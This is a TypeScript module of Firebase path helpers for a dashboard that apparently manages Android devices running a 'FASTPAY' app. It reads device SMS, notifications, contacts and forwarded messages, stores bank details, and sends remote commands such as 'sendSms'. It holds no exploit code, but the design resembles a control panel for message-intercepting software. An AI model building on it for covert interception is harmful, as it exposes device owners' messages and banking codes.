import { ref } from 'firebase/database'
import { database } from './firebase'

// Type for database reference - using ReturnType since DatabaseReference might not be exported
type DatabaseReference = ReturnType<typeof ref>

/**
 * Firebase Path Helpers
 *
 * Centralized path builders for Firebase Realtime Database
 * Following the structure from FASTPAY_BASE Android app
 */

/**
 * Get device-specific path
 * @param deviceId - Device ID (Android ID)
 * @param subPath - Optional sub-path (e.g., 'messages', 'Notification', 'Contact')
 * @returns Firebase database reference
 * 
 * UPDATED: Changed from fastpay/{deviceId} to device/{deviceId} to match APK structure
 */
export function getDevicePath(deviceId: string, subPath?: string): DatabaseReference {
  const basePath = `device/${deviceId}`
  const fullPath = subPath ? `${basePath}/${subPath}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device messages path
 * @param deviceId - Device ID
 * @returns Firebase database reference to messages
 * 
 * NEW PATH (APK Update): message/{deviceId}
 * OLD PATH (Deprecated): fastpay/{deviceId}/messages
 */
export function getDeviceMessagesPath(deviceId: string): DatabaseReference {
  // Updated to match new APK structure: message/{deviceId}
  return ref(database, `message/${deviceId}`)
}

/**
 * Get device notifications path
 * @param deviceId - Device ID
 * @returns Firebase database reference to notifications
 * 
 * NEW PATH (APK Update): notification/{deviceId}
 * OLD PATH (Deprecated): fastpay/{deviceId}/Notification
 */
export function getDeviceNotificationsPath(deviceId: string): DatabaseReference {
  // Updated to match new APK structure: notification/{deviceId}
  return ref(database, `notification/${deviceId}`)
}

/**
 * Get device contacts path
 * @param deviceId - Device ID
 * @returns Firebase database reference to Contact
 * 
 * NEW PATH (APK Update): contact/{deviceId}
 * OLD PATH (Deprecated): fastpay/{deviceId}/Contact
 */
export function getDeviceContactsPath(deviceId: string): DatabaseReference {
  // Updated to match new APK structure: contact/{deviceId}
  return ref(database, `contact/${deviceId}`)
}

/**
 * Get device system info path
 * @param deviceId - Device ID
 * @param subtask - Optional subtask (e.g., 'buildInfo', 'batteryInfo')
 * @returns Firebase database reference to systemInfo
 * 
 * UPDATED: Changed from fastpay/{deviceId}/systemInfo to device/{deviceId}/systemInfo to match APK structure
 */
export function getDeviceSystemInfoPath(deviceId: string, subtask?: string): DatabaseReference {
  const basePath = `device/${deviceId}/systemInfo`
  const fullPath = subtask ? `${basePath}/${subtask}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device commands path
 * @param deviceId - Device ID
 * @param command - Optional command name (e.g., 'sendSms', 'showNotification')
 * @returns Firebase database reference to commands
 */
export function getDeviceCommandsPath(deviceId: string, command?: string): DatabaseReference {
  const basePath = `fastpay/${deviceId}/commands`
  const fullPath = command ? `${basePath}/${command}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device command history path
 * @param deviceId - Device ID
 * @param timestamp - Optional timestamp to get specific history entry
 * @returns Firebase database reference to commandHistory
 */
export function getDeviceCommandHistoryPath(
  deviceId: string,
  timestamp?: number
): DatabaseReference {
  const basePath = `fastpay/${deviceId}/commandHistory`
  const fullPath = timestamp ? `${basePath}/${timestamp}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device permissions path (legacy - simple boolean flags)
 * @param deviceId - Device ID
 * @returns Firebase database reference to permission
 */
export function getDevicePermissionsPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'permission')
}

/**
 * Get device permission status path (new - detailed structure from checkPermission command)
 * @param deviceId - Device ID
 * @param timestamp - Optional timestamp to get specific permission status entry
 * @returns Firebase database reference to permissionStatus
 * 
 * UPDATED: Changed from fastpay/{deviceId}/systemInfo to device/{deviceId}/systemInfo to match APK structure
 */
export function getDevicePermissionStatusPath(
  deviceId: string,
  timestamp?: number
): DatabaseReference {
  const basePath = `device/${deviceId}/systemInfo/permissionStatus`
  const fullPath = timestamp ? `${basePath}/${timestamp}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device instruction card path
 * @param deviceId - Device ID
 * @returns Firebase database reference to instructioncard
 */
export function getDeviceInstructionCardPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'instructioncard')
}

/**
 * Get device animation settings path
 * @param deviceId - Device ID
 * @returns Firebase database reference to animationSettings
 */
export function getDeviceAnimationSettingsPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'animationSettings')
}


/**
 * Get device filter path
 * @param deviceId - Device ID
 * @returns Firebase database reference to filter
 */
export function getDeviceFilterPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'filter')
}


/**
 * Get device backup number path
 * @param deviceId - Device ID
 * @returns Firebase database reference to backupNumber
 */
export function getDeviceBackupNumberPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'backupNumber')
}

/**
 * Get device forwarded messages path
 * @param deviceId - Device ID
 * @returns Firebase database reference to forwardedMessages
 */
export function getDeviceForwardedMessagesPath(deviceId: string): DatabaseReference {
  return getDevicePath(deviceId, 'forwardedMessages')
}

/**
 * Get device metadata path (name, phone, code, isActive, etc.)
 * @param deviceId - Device ID
 * @param field - Optional field name (e.g., 'name', 'phone', 'code', 'isActive', 'lastSeen', 'batteryPercentage')
 * @returns Firebase database reference
 * 
 * UPDATED: Changed from fastpay/{deviceId} to device/{deviceId} to match APK structure
 */
export function getDeviceMetadataPath(deviceId: string, field?: string): DatabaseReference {
  const basePath = `device/${deviceId}`
  const fullPath = field ? `${basePath}/${field}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device-list path
 * @param code - Activation code
 * @param subPath - Optional sub-path (e.g., 'BANK', 'BANKSTATUS', 'deviceId')
 * @param mode - Optional mode ('testing', 'running', or 'device-list' for legacy)
 * @returns Firebase database reference
 */
export function getDeviceListPath(
  code: string,
  subPath?: string,
  mode?: 'testing' | 'running' | 'device-list'
): DatabaseReference {
  // If mode is specified, use it; otherwise default to legacy device-list path
  const modePath = mode === 'device-list' || !mode ? 'device-list' : mode
  const basePath = `fastpay/${modePath}/${code}`
  const fullPath = subPath ? `${basePath}/${subPath}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device-list path by mode (testing or running)
 * @param mode - Mode ('testing' or 'running')
 * @param code - Activation code
 * @param subPath - Optional sub-path
 * @returns Firebase database reference
 */
export function getDeviceListPathByMode(
  mode: 'testing' | 'running',
  code: string,
  subPath?: string
): DatabaseReference {
  return getDeviceListPath(code, subPath, mode)
}

/**
 * Get device metadata path with mode support
 * For devices in testing/running mode, device data might be at fastpay/{mode}/{code}/
 * @param deviceId - Device ID
 * @param field - Optional field name
 * @param mode - Optional mode ('testing' or 'running')
 * @param code - Optional activation code (required if mode is specified)
 * @returns Firebase database reference
 */
export function getDeviceMetadataPathWithMode(
  deviceId: string,
  field?: string,
  mode?: 'testing' | 'running',
  code?: string
): DatabaseReference {
  // If mode and code are provided, use mode-based path
  if (mode && code) {
    const basePath = `fastpay/${mode}/${code}`
    const fullPath = field ? `${basePath}/${field}` : basePath
    return ref(database, fullPath)
  }
  // Otherwise use standard device path
  return getDeviceMetadataPath(deviceId, field)
}

/**
 * Get all device-list entries path
 * @returns Firebase database reference to all device-list entries
 */
export function getAllDeviceListPath(): DatabaseReference {
  return ref(database, 'fastpay/device-list')
}

/**
 * Get device-list BANK path
 * @param code - Activation code
 * @param field - Optional field ('bank_name', 'company_name', 'other_info')
 * @returns Firebase database reference
 */
export function getDeviceListBankPath(code: string, field?: string): DatabaseReference {
  const basePath = `fastpay/device-list/${code}/BANK`
  const fullPath = field ? `${basePath}/${field}` : basePath
  return ref(database, fullPath)
}

/**
 * Get device-list BANKSTATUS path
 * @param code - Activation code
 * @param mode - Optional mode ('testing', 'running', or 'device-list' for legacy)
 * @returns Firebase database reference
 */
export function getDeviceListBankStatusPath(
  code: string,
  mode?: 'testing' | 'running' | 'device-list'
): DatabaseReference {
  return getDeviceListPath(code, 'BANKSTATUS', mode)
}

/**
 * Get device-list status_card_text path (for cycling text display)
 * @param code - Activation code
 * @param mode - Optional mode ('testing', 'running', or 'device-list' for legacy)
 * @returns Firebase database reference
 * 
 * Format: "Value1,Value2,Value3" - comma-separated values that cycle
 */
export function getDeviceListStatusCardTextPath(
  code: string,
  mode?: 'testing' | 'running' | 'device-list'
): DatabaseReference {
  return getDeviceListPath(code, 'status_card_text', mode)
}

/**
 * Get device-list bankcode object path (bankcode-{code} format)
 * @param code - Activation code
 * @param bankcode - Bank code (e.g., "XXXX1234")
 * @param mode - Optional mode ('testing', 'running', or 'device-list' for legacy)
 * @returns Firebase database reference
 * 
 * Format: fastpay/{mode}/{code}/bankcode-{bankcode}
 * Contains: bank_name, company_name, other_info
 */
export function getDeviceListBankcodePath(
  code: string,
  bankcode: string,
  mode?: 'testing' | 'running' | 'device-list'
): DatabaseReference {
  return getDeviceListPath(code, `bankcode-${bankcode}`, mode)
}

/**
 * Get app configuration path
 * @param subPath - Optional sub-path (e.g., 'version', 'config')
 * @returns Firebase database reference
 */
export function getAppConfigPath(subPath?: string): DatabaseReference {
  const basePath = 'fastpay/app'
  const fullPath = subPath ? `${basePath}/${subPath}` : basePath
  return ref(database, fullPath)
}

/**
 * Get user devices path (for admin user device assignments)
 * @param emailPath - Email path (with dots replaced)
 * @returns Firebase database reference
 */
export function getUserDevicesPath(emailPath: string): DatabaseReference {
  return ref(database, `users/${emailPath}/device`)
}

/**
 * Get all devices path (for demo/admin access)
 * @returns Firebase database reference to all devices
 */
export function getAllDevicesPath(): DatabaseReference {
  return ref(database, 'fastpay')
}

/**
 * Get heartbeats path (lightweight device status)
 * Optimized path separate from main device data to avoid triggering full tree syncs
 * @param deviceId - Optional device ID for single device
 * @returns Firebase database reference
 * 
 * UPDATED: Changed from fastpay/heartbeats to hertbit to match APK structure (note: typo in APK but must match)
 */
export function getHeartbeatsPath(deviceId?: string): DatabaseReference {
  const basePath = 'hertbit'
  const fullPath = deviceId ? `${basePath}/${deviceId}` : basePath
  return ref(database, fullPath)
}

/**
 * Type definitions for Firebase structures
 */

export interface DeviceMetadata {
  name?: string
  phone?: string
  code?: string
  isActive?: boolean
  lastSeen?: number
  batteryPercentage?: number
  currentPhone?: string
  currentIdentifier?: string
  time?: number
  bankcard?: string
}

export interface BankInfo {
  bank_name?: string
  company_name?: string
  other_info?: string
}

export interface BankStatus {
  [statusName: string]: string // { statusName: color }
}

export interface DeviceListEntry {
  deviceId: string
  BANK?: BankInfo
  BANKSTATUS?: BankStatus
  version?: string
  created_at?: number
  device_model?: string
  status?: string
  number?: string
}

export interface DevicePermission {
  sms?: boolean
  contacts?: boolean
  notification?: boolean
  battery?: boolean
  phone_state?: boolean
}

export interface DeviceFilter {
  sms?: string
  notification?: string // Empty = enabled, "~DISABLED~" = disabled
}

export interface CommandHistoryEntry {
  command: string
  value: string
  timestamp: number
  status: 'pending' | 'executed' | 'failed'
  deviceId: string
  receivedAt: number
  executedAt?: number
  error?: string
}

export interface CommandHistoryGroup {
  [timestamp: string]: {
    [commandKey: string]: CommandHistoryEntry
  }
}
